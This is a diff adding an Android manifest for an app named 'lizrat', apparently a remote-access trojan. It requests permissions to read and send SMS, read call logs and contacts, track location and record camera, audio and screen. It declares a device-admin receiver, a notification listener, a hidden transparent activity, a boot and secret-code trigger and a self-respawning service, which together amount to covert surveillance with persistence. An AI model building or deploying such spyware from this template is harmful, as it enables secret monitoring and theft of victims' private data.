@@ -1,0 +1,130 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest
+    obfuscation:compileSdkVersion="31"
+    obfuscation:compileSdkVersionCodename="12"
+    package="com.Liz0rd.lizrat"
+    platformBuildVersionCode="31"
+    platformBuildVersionName="12"
+    xmlns:obfuscation="http://schemas.android.com/apk/res/android">
+    <uses-feature
+        obfuscation:name="android.hardware.camera" />
+    <uses-permission
+        obfuscation:name="android.permission.READ_SMS" />
+    <uses-permission
+        obfuscation:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission
+        obfuscation:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission
+        obfuscation:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission
+        obfuscation:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission
+        obfuscation:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission
+        obfuscation:name="android.permission.RECORD_VIDEO" />
+    <uses-permission
+        obfuscation:name="android.permission.SEND_SMS" />
+    <uses-permission
+        obfuscation:name="android.permission.RECORD_AUDIO" />
+    <uses-permission
+        obfuscation:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission
+        obfuscation:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission
+        obfuscation:name="android.permission.CAMERA" />
+    <uses-permission
+        obfuscation:name="android.permission.READ_CALL_LOG" />
+    <uses-permission
+        obfuscation:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission
+        obfuscation:name="android.permission.READ_CONTACTS" />
+    <uses-permission
+        obfuscation:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission
+        obfuscation:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission
+        obfuscation:name="android.permission.WAKE_LOCK" />
+    <uses-permission
+        obfuscation:name="android.permission.INTERNET" />
+    <application
+        obfuscation:theme="@style/AppTheme"
+        obfuscation:label="@string/app_name"
+        obfuscation:icon="@mipmap/ic_launcher"
+        obfuscation:debuggable="true"
+        obfuscation:allowBackup="true"
+        obfuscation:hardwareAccelerated="false"
+        obfuscation:largeHeap="true"
+        obfuscation:supportsRtl="true">
+        <service
+            obfuscation:name=".Screenshot" />
+        <receiver
+            obfuscation:label="@string/device_admin_label"
+            obfuscation:name=".DeviceAdmin"
+            obfuscation:permission="android.permission.BIND_DEVICE_ADMIN"
+            obfuscation:description="@string/device_description">
+            <meta-data
+                obfuscation:name="android.app.device_admin"
+                obfuscation:resource="@xml/admin" />
+            <intent-filter>
+                <action
+                    obfuscation:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+        <activity
+            obfuscation:name=".MainActivity"
+            obfuscation:launchMode="singleInstance">
+            <intent-filter>
+                <action
+                    obfuscation:name="android.intent.action.MAIN" />
+                <category
+                    obfuscation:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+        <service
+            obfuscation:name=".MainService"
+            obfuscation:enabled="true"
+            obfuscation:exported="false" />
+        <receiver
+            obfuscation:name=".MyReceiver"
+            obfuscation:enabled="true"
+            obfuscation:exported="true">
+            <intent-filter>
+                <action
+                    obfuscation:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+            <intent-filter>
+                <data
+                    obfuscation:scheme="android_secret_code" />
+                <action
+                    obfuscation:name="android.provider.Telephony.SECRET_CODE" />
+            </intent-filter>
+        </receiver>
+        <service
+            obfuscation:name=".CamService" />
+        <activity
+            obfuscation:theme="@style/TransParent"
+            obfuscation:name=".TransparentActivity"
+            obfuscation:excludeFromRecents="true" />
+        <service
+            obfuscation:label="@string/app_name"
+            obfuscation:name=".NotificationListener"
+            obfuscation:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action
+                    obfuscation:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+        <receiver
+            obfuscation:label="RestartServiceWhenStopped"
+            obfuscation:name=".ServiceReciever"
+            obfuscation:enabled="true"
+            obfuscation:exported="true">
+            <intent-filter>
+                <action
+                    obfuscation:name="respawnService" />
+            </intent-filter>
+        </receiver>
+        <service
+            obfuscation:name=".ScreenRecorderService" />
+    </application>
+</manifest>
